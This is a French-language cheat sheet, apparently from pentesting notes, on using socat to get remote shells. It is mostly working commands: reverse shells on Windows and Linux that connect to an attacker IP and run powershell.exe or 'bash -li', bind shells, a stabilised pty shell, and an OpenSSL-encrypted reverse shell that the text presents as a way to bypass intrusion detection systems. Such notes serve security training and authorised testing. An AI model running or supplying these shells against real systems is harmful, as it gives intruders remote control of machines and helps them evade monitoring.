
## __Reverse shell__

[Binaire précompilé de socat](Binaries##__Linux__###x86-64####Socat) 
Pour setup un reverse shell avec socat c'est légèrement plus compliqué qu'avec netcat.

#### 1- Listener -- Notre machine

Sur notre machine il faut effectuer la commande :

```shell
user@ip: ~$ socat TCP-L:1345 -
```

Cette commande est équivalente à faire **`nc -vnlp 1234`**.

#### 2- Connection -- Machine cible

Sur la machine cible, on va effectuer la commande :

1) Sur une machine **windows**

```shell
PS C:\Users\user> socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

2) Sur une machine **linux**

```shell
user@raspberrypi: ~$ socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:"bash -li"
```


## __Bind shell__

#### 1- Listener -- Machine cible

1) Sur la machine cible sous **Linux** :

```shell
user@raspberrypi: ~$ socat TCP-L:<TARGET-PORT> EXEC:"bash -li"
```

2) Sur une machine **Windows**

```shell
PS C:\Users\user> socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

#### 2- Connection -- Notre machine

```shell
user@ip: ~$ socat TCP:<TARGET-IP>:<TARGET-PORT> -
```


## __Stable Reverse shell__

Pour setup un reverse shell entièrement stable, on va

#### 1- Listener -- Notre machine

```shell
user@ip: ~$ socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

C'est l'équivalent de faire `stty raw -echo; fg`.

#### 2- Connection -- Machine cible

```shell
user@raspberrypi: ~$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

| Argument   | But                                                                                                                       |
| ---------- | ------------------------------------------------------------------------------------------------------------------------- |
| **pty**    | alloue un pseudoterminal sur la cible -- partie du processus de stabilisation                                             |
| **stderr** | s'assure que tous les messages d'erreur sont affichés dans le shell                                                       |
| **sigint** | transmet toutes les commandes Ctrl + C au sous-processus, ce qui nous permet de tuer les commandes à l'intérieur du shell |
| **setsid** | crée le processus dans une nouvelle session                                                                               |
| **sane**   |  stabilise le terminal en essayant de le "normaliser".                                                                                                                          |


## __Encrypted shell__

Les **shells chiffré** sont très utile pour **bypass les IDS** car ils ne peuvent **pas être lue** à part si l'on a la **clé de déchiffrement**.

La **syntaxe** pour les shells encrypté n'est pas différente à l'exception que le mot clé **TCP** est remplacé par **OPENSSL**.

Notez qu'on peut combiner cette syntaxe avec celle de [[Socat#__Stable Reverse shell__]]

#### 1- Générer le certificat -- Notre machine

```shell
user@ip: ~$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Crée une **clé RSA de 2048 bits** dans un fichier **shell.key** et un **certificat correspondant** valide pendant 362 jours dans **shell.crt**.

#### 2- Fusion des clé et certificats -- Notre machine

```shell
user@ip: ~$ cat shell.key shell.crt > shell.pem
```

Fusion des 2 fichiers dans un fichier **shell.pem**.

#### 3- Listener -- Notre machine

```shell
user@ip: ~$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

**verify=0** indique qu'on ne veut **pas valider** que notre certificat a été signé par une **autorité reconnue**.

#### 4- Connection -- Machine cible

```shell
user@raspberrypi: ~$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

